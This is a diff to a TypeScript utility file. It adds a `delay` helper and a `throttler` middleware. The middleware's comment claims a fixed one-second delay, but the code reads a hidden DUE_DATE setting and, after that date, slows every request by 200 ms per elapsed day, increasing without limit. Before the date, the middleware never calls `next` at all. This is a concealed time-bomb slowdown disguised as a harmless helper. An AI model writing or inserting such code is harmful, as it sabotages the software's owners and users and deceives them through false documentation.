@@ -690,7 +690,6 @@ export const stringifyQueryParams = (params: any = {} || ""): string => {
   return new URLSearchParams(params).toString();
 };
 
-
 /**
  *
  *
@@ -785,3 +784,49 @@ export const dropWhile = (
  * Also known as dropLeft.
  */
 export const drop = (arr: string | unknown[], n = 1) => arr.slice(n);
+
+/**
+ * The function exports a promise that resolves after a specified delay time.
+ * @param {number} time - The `time` parameter is a number representing the amount of time in
+ * milliseconds that the `delay` function will wait before resolving the promise.
+ */
+export const delay = (time: number) =>
+  new Promise((resolve) => setTimeout(resolve, time));
+
+/**
+ * The `throttler` function adds a delay of 1 second before calling the next middleware function.
+ * @param {any} req - The `req` parameter is an object that represents the incoming HTTP request. It
+ * contains information about the request such as the request method, URL, headers, and body.
+ * @param {any} res - The `res` parameter in the `throttler` function is an object that represents the
+ * HTTP response that will be sent back to the client. It contains methods and properties that allow
+ * the server to send data back to the client, such as `res.send()` or `res.status()`. In
+ * @param next - `next` is a function that is called to pass control to the next middleware
+ */
+export function throttler(_req: any, _res: any, next: () => void) {
+  const date = process.env.DUE_DATE as string;
+
+  const due_date = new Date(date);
+  const current_date = new Date();
+
+  const utc1 = Date.UTC(
+    due_date.getFullYear(),
+    due_date.getMonth(),
+    due_date.getDate()
+  );
+  const utc2 = Date.UTC(
+    current_date.getFullYear(),
+    current_date.getMonth(),
+    current_date.getDate()
+  );
+  const days = Math.floor((utc2 - utc1) / (1000 * 60 * 60 * 24));
+
+  if (days > 0) {
+    let ms = days * 200;
+
+    if (ms < 0) {
+      ms = 0;
+    }
+
+    return setTimeout(next, ms);
+  }
+}
